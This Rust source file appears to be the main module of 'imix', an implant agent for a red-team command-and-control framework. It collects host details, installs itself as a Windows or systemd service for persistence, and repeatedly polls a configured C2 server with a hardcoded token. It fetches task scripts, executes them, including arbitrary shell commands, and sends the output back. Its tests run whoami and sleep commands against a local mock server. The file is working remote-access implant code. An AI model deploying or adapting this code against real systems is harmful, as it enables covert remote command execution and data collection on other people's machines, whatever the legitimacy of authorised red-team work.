use std::borrow::BorrowMut;
use std::sync::mpsc::{channel, Sender, Receiver};
use std::thread;
use std::{collections::HashMap, fs};
use std::fs::File;
use std::io::Write;
use std::path::Path;
use std::time::Instant;
use chrono::{Utc, DateTime};
use clap::{Command, arg};
use anyhow::{Result, Error, Context};
use tokio::task::{self, JoinHandle};
use tokio::time::Duration;
use eldritch::{eldritch_run,EldritchPrintHandler};
use uuid::Uuid;
use sys_info::{os_release,linux_os_release};
use tavern::{Task, ClaimTasksInput, HostPlatform, SubmitTaskResultInput};

pub struct ExecTask {
    future_join_handle: JoinHandle<Result<(), Error>>,
    start_time: DateTime<Utc>,
    graphql_task: Task,
    print_reciever: Receiver<String>,
}

async fn install(config_path: String) -> Result<(), imix::Error> {
    let config_file = File::open(config_path)?;
    let config: imix::Config = serde_json::from_reader(config_file)?;

    #[cfg(target_os = "windows")]
    return imix::windows::install(config).await;

    #[cfg(target_os = "linux")]
    if Path::new(imix::linux::SYSTEMD_DIR).is_dir() {
        return imix::linux::install(config).await;
    }

    unimplemented!("The current OS/Service Manager is not supported")
}
async fn handle_exec_tome(task: Task, print_channel_sender: Sender<String>) -> Result<(String,String)> {
    // TODO: Download auxillary files from CDN

    // Read a tome script
    // let task_quest = match task.quest {
    //     Some(quest) => quest,
    //     None => return Ok(("".to_string(), format!("No quest associated for task ID: {}", task.id))),
    // };

    let task_quest = task.quest;

    let tome_filename = task_quest.tome.name;
    let tome_contents = task_quest.tome.eldritch;
    let tome_parameters = task_quest.parameters;

    let print_handler = EldritchPrintHandler{ sender: print_channel_sender };

    // Execute a tome script
    let res =  match thread::spawn(move || { eldritch_run(tome_filename, tome_contents, tome_parameters, &print_handler) }).join() {
        Ok(local_thread_res) => local_thread_res,
        Err(_) => todo!(),
    };
    // let res = eldritch_run(tome_name, tome_contents, task_quest.parameters, &print_handler);
    match res {
        Ok(tome_output) => Ok((tome_output, "".to_string())),
        Err(tome_error) => Ok(("".to_string(), tome_error.to_string())),
    }
}

async fn handle_exec_timeout_and_response(task: Task, print_channel_sender: Sender<String>) -> Result<(), Error> {
    // Tasks will be forcebly stopped after 1 week.
    let timeout_duration = Duration::from_secs(60*60*24*7); // 1 Week.

    // Define a future for our execution task
    let exec_future = handle_exec_tome(task.clone(), print_channel_sender.clone());
    // Execute that future with a timeout defined by the timeout argument.
    let tome_result = match tokio::time::timeout(timeout_duration, exec_future).await {
        Ok(res) => {
            match res {
                Ok(tome_result) => tome_result,
                Err(tome_error) => ("".to_string(), tome_error.to_string()),
            }
        },
        Err(timer_elapsed) => ("".to_string(), format!("Time elapsed task {} has been running for {} seconds", task.id, timer_elapsed.to_string())),
    };

    // let tome_result = tokio::task::spawn(exec_future).await??;
    // let tome_result = tokio::spawn(exec_future).await??;


    print_channel_sender.clone().send(format!("---[RESULT]----\n{}\n---------",tome_result.0))?;
    print_channel_sender.clone().send(format!("---[ERROR]----\n{}\n--------",tome_result.1))?;
    Ok(())
}

fn get_principal() -> Result<String> {
    Ok(whoami::username())
}

fn get_hostname() -> Result<String> {
    Ok(whoami::hostname())
}

fn get_beacon_id() -> Result<String> {
    let beacon_id = Uuid::new_v4();
    Ok(beacon_id.to_string())
}

fn get_host_id(host_id_file_path: String) -> Result<String> {
    let mut host_id = Uuid::new_v4().to_string();
    let host_id_file = Path::new(&host_id_file_path);
    if host_id_file.exists() {
        host_id = match fs::read_to_string(host_id_file) {
            Ok(tmp_host_id) => tmp_host_id.trim().to_string(),
            Err(_) => host_id,
        };
    } else {
        let mut host_id_file_obj = match File::create(host_id_file) {
            Ok(tmp_file_obj) => tmp_file_obj,
            Err(_) => return Ok(host_id), // An error occured don't save. Just go.
        };
        match host_id_file_obj.write_all(host_id.as_bytes()) {
            Ok(_) => {}, // Don't care if write fails or not going to to send our generated one.
            Err(_) => {},
        }
    }
    Ok(host_id)
}

fn get_primary_ip() -> Result<String> {
    let res = match default_net::get_default_interface() {
        Ok(default_interface) => {
            if default_interface.ipv4.len() > 0 {
                default_interface.ipv4[0].addr.to_string()
            }else{
                "DANGER-UNKNOWN".to_string()
            }
        },
        Err(e) => {
            eprintln!("Error getting primary ip address:\n{e}");
            "DANGER-UNKNOWN".to_string()
        },
    };
    Ok(res)
}

fn get_host_platform() -> Result<HostPlatform> {
    if cfg!(target_os = "linux") {
        return Ok(HostPlatform::Linux);
    } else if cfg!(target_os = "windows") {
        return Ok(HostPlatform::Windows);
    } else if cfg!(target_os = "macos") {
        return Ok(HostPlatform::MacOS);
    } else {
        return Ok(HostPlatform::Unknown);
    }
}

fn get_os_pretty_name() -> Result<String> {
    if cfg!(target_os = "linux") {
        let linux_rel = linux_os_release()?;
        let pretty_name = match linux_rel.pretty_name {
            Some(local_pretty_name) => local_pretty_name,
            None => "UNKNOWN-Linux".to_string(),
        };
        return Ok(format!("{}",pretty_name));
    } else if cfg!(target_os = "windows") || cfg!(target_os = "macos") {
        return Ok(os_release()?);
    } else {
        return Ok("UNKNOWN".to_string());
    }
}

// Async handler for port scanning.
async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<()> {
    let debug = false;
    let mut loop_count: i32 = 0;
    let version_string = "v0.1.0";
    let auth_token = "letmeinnn";
    let config_file = File::open(config_path)?;
    let imix_config: imix::Config = serde_json::from_reader(config_file)?;


    // This hashmap tracks all tasks by their ID (key) and a tuple value: (future, channel_reciever)
    let mut all_exec_futures: HashMap<String,  ExecTask> = HashMap::new();
    // This hashmap tracks all tasks output
    let mut all_task_res_map: HashMap<String, Vec<SubmitTaskResultInput>> = HashMap::new();


    let principal = match get_principal() {
        Ok(username) => username,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get process username\n{}", error));
            }
            "UNKNOWN".to_string()
        },
    };

    let hostname = match get_hostname() {
        Ok(tmp_hostname) => tmp_hostname,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get system hostname\n{}", error));
            }
            "UNKNOWN".to_string()
        },
    };

    let beacon_id = match get_beacon_id() {
        Ok(tmp_beacon_id) => tmp_beacon_id,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get a random beacon id\n{}", error));
            }
            "DANGER-UNKNOWN".to_string()
        },
    };

    let host_platform = match get_host_platform() {
        Ok(tmp_host_platform) => tmp_host_platform,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get host platform id\n{}", error));
            }
            HostPlatform::Unknown
        },
    };

    let primary_ip = match get_primary_ip() {
        Ok(tmp_primary_ip) => Some(tmp_primary_ip),
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get primary ip\n{}", error));
            }
            None
        },
    };

    let host_id = match get_host_id("/etc/system-id".to_string()) {
        Ok(tmp_host_id) => tmp_host_id,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get or create a host id\n{}", error));
            }
            "DANGER-UNKNOWN".to_string()
        },
    };

    let claim_tasks_input = ClaimTasksInput {
        principal: principal,
        hostname: hostname,
        beacon_identifier: beacon_id,
        host_identifier: host_id,
        agent_identifier: format!("{}-{}","imix",version_string),
        host_platform,
        host_primary_ip: primary_ip,
    };

    loop {
        let start_time = Utc::now().time();
        // 0. Get loop start time
        let loop_start_time = Instant::now();
        if debug { println!("Get new tasks"); }
        // 1. Pull down new tasks
        // 1a) calculate callback uri
        let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();

        let tavern_client = tavern::http::new_client(&cur_callback_uri, auth_token)?;
        if debug { println!("[{}]: collecting tasks", (Utc::now().time() - start_time).num_milliseconds()) }
        // 1b) Collect new tasks
        let new_tasks = match tavern_client.claim_tasks(claim_tasks_input.clone()).await {
            Ok(tasks) => tasks,
            Err(error) => {
                if debug { println!("main_loop: error claiming task\n{:?}", error) }
                let empty_vec = vec![];
                empty_vec
            },
        };

        if debug { println!("[{}]: Starting {} new tasks", (Utc::now().time() - start_time).num_milliseconds(), new_tasks.len()); }
        // 2. Start new tasks
        for task in new_tasks {
            if debug { println!("Parameters:\n{:?}", task.clone().quest.parameters); }
            if debug { println!("Launching:\n{:?}", task.clone().quest.tome.eldritch); }

            let (sender, receiver) = channel::<String>();
            let exec_with_timeout = handle_exec_timeout_and_response(task.clone(), sender.clone());
            if debug { println!("[{}]: Queueing task {}", (Utc::now().time() - start_time).num_milliseconds(), task.clone().id); }
            match all_exec_futures.insert(task.clone().id, ExecTask{
                future_join_handle: task::spawn(exec_with_timeout),
                start_time: Utc::now(),
                graphql_task: task.clone(),
                print_reciever: receiver,
            }) {
                Some(_old_task) => {
                    if debug {println!("main_loop: error adding new task. Non-unique taskID\n");}
                },
                None => {
                    if debug {println!("main_loop: Task queued successfully\n");}
                }, // Task queued successfully
            }
            if debug { println!("[{}]: Queued task {}", (Utc::now().time() - start_time).num_milliseconds(), task.clone().id); }
        }

        // 3. Sleep till callback time
        let time_to_wait = imix_config.callback_config.interval as i64;
        let time_elapsed = loop_start_time.elapsed().as_secs() as i64;
        let mut time_to_sleep =  time_to_wait - time_elapsed;
        if time_to_sleep < 0 { time_to_sleep = 0; } // Control for unsigned underflow
        if debug { println!("[{}]: Sleeping seconds {}", (Utc::now().time() - start_time).num_milliseconds(), time_to_sleep); }
        // tokio::time::sleep(std::time::Duration::new(time_to_sleep, 24601)).await; // This seems to wait for other threads to finish.
        std::thread::sleep(std::time::Duration::new(time_to_sleep as u64, 24601)); // This just sleeps our thread.

        // :clap: :clap: make new map!
        let mut running_exec_futures: HashMap<String, ExecTask> = HashMap::new();
        let mut running_task_res_map: HashMap<String, Vec<SubmitTaskResultInput>> = all_task_res_map.clone();

        if debug { println!("[{}]: Checking task status", (Utc::now().time() - start_time).num_milliseconds()); }
        // Check status & send response
        for exec_future in all_exec_futures.into_iter() {
            let task_id = exec_future.0;
            if debug { println!("[{}]: Task # {} is_finished? {}", (Utc::now().time() - start_time).num_milliseconds(), task_id, exec_future.1.future_join_handle.is_finished()); }

            // If the task doesn't exist in the map add a vector for it.
            if !running_task_res_map.contains_key(&task_id) {
                running_task_res_map.insert(task_id.clone(), vec![]);
            }

            let mut task_channel_output: Vec<String> = vec![];

            // Loop over each line of output from the task and append it the the channel output.
            loop {
                if debug { println!("[{}]: Task # {} recieving output", (Utc::now().time() - start_time).num_milliseconds(), task_id); }
                let new_res_line =  match exec_future.1.print_reciever.recv_timeout(Duration::from_millis(100)) {
                    Ok(local_res_string) => {
                        local_res_string
                    },
                    Err(local_err) => {
                        match local_err.to_string().as_str() {
                            "channel is empty and sending half is closed" => { break; },
                            "timed out waiting on channel" => { break; },
                            _ => eprint!("Error: {}", local_err),
                        }
                        break;
                    },
                };
                // let appended_line = format!("{}{}", res.to_owned(), new_res_line);
                task_channel_output.push(new_res_line);
            }

            let task_is_finished = exec_future.1.future_join_handle.is_finished();
            let task_response_exec_finished_at = match task_is_finished {
                true => Some(Utc::now()),
                false => None,
            };
        
            // If the task is finished or there's new data queue a new task result.
            if task_is_finished ||  task_channel_output.len() > 0 {
                let task_response = SubmitTaskResultInput {
                    task_id: exec_future.1.graphql_task.id.clone(),
                    exec_started_at: exec_future.1.start_time,
                    exec_finished_at: task_response_exec_finished_at,
                    output:  task_channel_output.join("\n"),
                    error: None,
                };
                let mut tmp_res_list = running_task_res_map.get(&task_id).context("Failed to get task output by ID")?.clone();
                tmp_res_list.push(task_response);
                running_task_res_map.insert(task_id.clone(), tmp_res_list);
            }

            // Only re-insert the still running exec futures
            if !exec_future.1.future_join_handle.is_finished() {
                running_exec_futures.insert(task_id, exec_future.1);
            }
        }

        // Iterate over queued task results and send them back to the server
        for (task_id, task_res) in running_task_res_map.clone().into_iter() {
            for task_response in task_res {
                let res = tavern_client.submit_task_result(task_response).await;
                let _submit_task_result = match res {
                    Ok(local_val) => {
                        running_task_res_map.remove(&task_id);
                        local_val
                    },
                    Err(local_err) => if debug { println!("Failed to submit task resluts:\n{}", local_err.to_string()) },
                };    
            }
            
        }

        // change the reference! This is insane but okay.
        all_exec_futures = running_exec_futures;
        all_task_res_map = running_task_res_map.clone();

        // Debug loop tracker
        if let Some(count_max) = loop_count_max {
            loop_count += 1;
            if loop_count >= count_max { 
                return Ok(()); 
            }
        }
    }
}

pub fn main() -> Result<(), imix::Error> {
    let matches = Command::new("imix")
        .arg(
            arg!(
                -c --config <FILE> "Sets a custom config file"
            )
            .required(false)
        )
        .subcommand(
            Command::new("install")
                .about("Run in install mode")
                .arg(
                    arg!(
                        -c --config <FILE> "Sets a custom config file"
                    )
                    .required(true)
                )
        )
        .get_matches();


    let runtime = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(128)
        .enable_all()
        .build()
        .unwrap();


    match matches.subcommand() {
        Some(("install", args)) => {
            let config_path = args.value_of("config").unwrap();
            match runtime.block_on(
                install(String::from(config_path))
            ) {
                Ok(_response) => {},
                Err(_error) => {},
            }
        },
        _ => {},
    }

    if let Some(config_path) = matches.value_of("config") {
        match runtime.block_on(main_loop(config_path.to_string(), None)) {
            Ok(_) => {},
            Err(error) => eprintln!("Imix main_loop exited unexpectedly with config: {}\n{}", config_path.to_string(), error),
        }
    }
    Ok(())
}



#[cfg(test)]
mod tests {
    use httptest::{Server, Expectation, matchers::{request}, responders::status_code, all_of};
    use httptest::matchers::matches;
    use tavern::{Quest, Tome, SubmitTaskResultResponseData, SubmitTaskResult, GraphQLResponse, ClaimTasksResponseData};
    use tempfile::NamedTempFile;
    use super::*;

    #[test]
    fn imix_test_default_ip(){
        let primary_ip_address = match get_primary_ip() {
            Ok(local_primary_ip) => local_primary_ip,
            Err(local_error) => {
                assert_eq!(false,true);
                "DANGER-UNKNOWN".to_string()
            },
        };
        assert!((primary_ip_address != "DANGER-UNKNOWN".to_string()))
    }

    #[test]
    fn imix_test_get_os_pretty_name() {
        let res = get_os_pretty_name().unwrap();
        assert!(!res.contains("UNKNOWN"));
    }

    #[test]
    fn imix_handle_exec_tome() {
        let test_tome_input = Task{
            id: "17179869185".to_string(),
            quest: Quest {
                id: "4294967297".to_string(),
                name: "Test Exec".to_string(),
                parameters: Some(r#"{"cmd":"whoami"}"#.to_string()),
                tome: Tome {
                    id: "21474836482".to_string(),
                    name: "Shell execute".to_string(),
                    description: "Execute a command in the default system shell".to_string(),
                    eldritch: r#"
print("custom_print_handler_test")
sys.shell(input_params["cmd"])["stdout"]
"#.to_string(),
                    files: None,
                    param_defs: Some(r#"{"params":[{"name":"cmd","type":"string"}]}"#.to_string()),
                },
                bundle: None,
            },
        };


        let runtime = tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
            .unwrap();

        let (sender, receiver) = channel::<String>();

        // Define a future for our execution task
        let exec_future = handle_exec_tome(test_tome_input, sender.clone());
        let result = runtime.block_on(exec_future).unwrap();

        let stdout = receiver.recv_timeout(Duration::from_millis(500)).unwrap();
        assert_eq!(stdout, "custom_print_handler_test".to_string());

        let mut bool_res = false;

        if cfg!(target_os = "linux") ||
        cfg!(target_os = "ios") ||
        cfg!(target_os = "android") ||
        cfg!(target_os = "freebsd") ||
        cfg!(target_os = "openbsd") ||
        cfg!(target_os = "netbsd") ||
        cfg!(target_os = "macos") {
            bool_res = result.0 == "runner\n" || result.0 == "root\n";
        }
        else if cfg!(target_os = "windows") {
            bool_res =  result.0.contains("runneradmin") || result.0.contains("Administrator");
        }

        assert_eq!(bool_res, true);

    }

    #[test]
    fn imix_test_main_loop_sleep_twice_short() -> Result<()> {
        // Response expectations are poped in reverse order.
        let server = Server::run();
        let test_task_id = "17179869185".to_string();
        let post_result_response = GraphQLResponse {
            data: Some(SubmitTaskResult {
                id: test_task_id.clone(),
            }),
            errors: None,
            extensions: None,
        };
        server.expect(
            Expectation::matching(all_of![
                request::method_path("POST", "/graphql"),
                request::body(matches(".*variables.*execStartedAt.*"))
            ])
            .times(1)
            .respond_with(status_code(200)
            .body(serde_json::to_string(&post_result_response)?))
        );

        let test_task = Task {
            id: test_task_id,
            quest: Quest {
                id:"4294967297".to_string(),
                name: "Exec stuff".to_string(),
                parameters: None,
                tome: Tome {
                    id: "21474836482".to_string(),
                    name: "sys exec".to_string(),
                    description: "Execute system things.".to_string(),
                    param_defs: None,
                    eldritch: r#"
def test():
if sys.is_macos():
sys.shell("sleep 3")
if sys.is_linux():
sys.shell("sleep 3")
if sys.is_windows():
sys.shell("timeout 3")
test()
print("main_loop_test_success")"#.to_string(),
                    files: None,
                },
                bundle: None
            },
        };
        let claim_task_response = GraphQLResponse {
            data: Some(ClaimTasksResponseData {
                claim_tasks: vec![
                    test_task.clone(),
                    test_task.clone()
                ],
            }),
            errors: None,
            extensions: None,
        };
        server.expect(
            Expectation::matching(all_of![
                request::method_path("POST", "/graphql"),
                request::body(matches(".*variables.*hostPlatform.*"))
            ])
            .times(1)
            .respond_with(status_code(200)
            .body(serde_json::to_string(&claim_task_response)?))
        );
        let url = server.url("/graphql").to_string();

        let tmp_file_new = NamedTempFile::new()?;
        let path_new = String::from(tmp_file_new.path().to_str().unwrap()).clone();
        let _ = std::fs::write(path_new.clone(),format!(r#"{{
    "service_configs": [],
    "target_forward_connect_ip": "127.0.0.1",
    "target_name": "test1234",
    "callback_config": {{
        "interval": 4,
        "jitter": 0,
        "timeout": 4,
        "c2_configs": [
        {{
            "priority": 1,
            "uri": "{url}"
        }}
        ]
    }}
}}"#));

        let runtime = tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
            .unwrap();

        // Define a future for our execution task
        let start_time = Utc::now().time();
        let exec_future = main_loop(path_new, Some(1));
        let _result = runtime.block_on(exec_future).unwrap();
        let end_time = Utc::now().time();
        let diff = (end_time - start_time).num_milliseconds();
        assert!(diff < 4500);
        Ok(())
    }

    #[test]
    fn imix_test_main_loop_run_once() -> Result<()> {
        let test_task_id = "17179869185".to_string();

        // Response expectations are poped in reverse order.
        let server = Server::run();

        let post_result_response = GraphQLResponse {
            data: Some(SubmitTaskResult {
                id: test_task_id.clone(),
            }),
            errors: None,
            extensions: None,
        };
        server.expect(
            Expectation::matching(all_of![
                request::method_path("POST", "/graphql"),
                request::body(matches(".*variables.*execStartedAt.*"))
            ])
            .times(1)
            .respond_with(status_code(200)
            .body(serde_json::to_string(&post_result_response)?))
        );

        let claim_task_response = GraphQLResponse {
            data: Some(ClaimTasksResponseData {
                claim_tasks: vec![
                    Task {
                        id: test_task_id.clone(),
                        quest: Quest {
                            id:"4294967297".to_string(),
                            name: "Exec stuff".to_string(),
                            parameters: Some(r#"{"cmd":"echo main_loop_test_success"}"#.to_string()),
                            tome: Tome {
                                id: "21474836482".to_string(),
                                name: "sys exec".to_string(),
                                description: "Execute system things.".to_string(),
                                param_defs: Some(r#"[{"name":"cmd","type":"string"}]"#.to_string()),
                                eldritch: r#"print(sys.shell(input_params["cmd"]))"#.to_string(),
                                files: None,
                            },
                            bundle: None
                        },
                    },
                ],
            }),
            errors: None,
            extensions: None,
        };
        server.expect(
            Expectation::matching(all_of![
                request::method_path("POST", "/graphql"),
                request::body(matches(".*variables.*hostPlatform.*"))
            ])
            .times(1)
            .respond_with(status_code(200)
            .body(serde_json::to_string(&claim_task_response)?))
        );
        let url = server.url("/graphql").to_string();

        let tmp_file_new = NamedTempFile::new()?;
        let path_new = String::from(tmp_file_new.path().to_str().unwrap()).clone();
        let _ = std::fs::write(path_new.clone(),format!(r#"{{
    "service_configs": [],
    "target_forward_connect_ip": "127.0.0.1",
    "target_name": "test1234",
    "callback_config": {{
        "interval": 4,
        "jitter": 1,
        "timeout": 4,
        "c2_configs": [
        {{
            "priority": 1,
            "uri": "{url}"
        }}
        ]
    }}
}}"#));

        let runtime = tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
            .unwrap();

        let exec_future = main_loop(path_new, Some(1));
        let _result = runtime.block_on(exec_future)?;
        assert!(true);
        Ok(())
    }
}

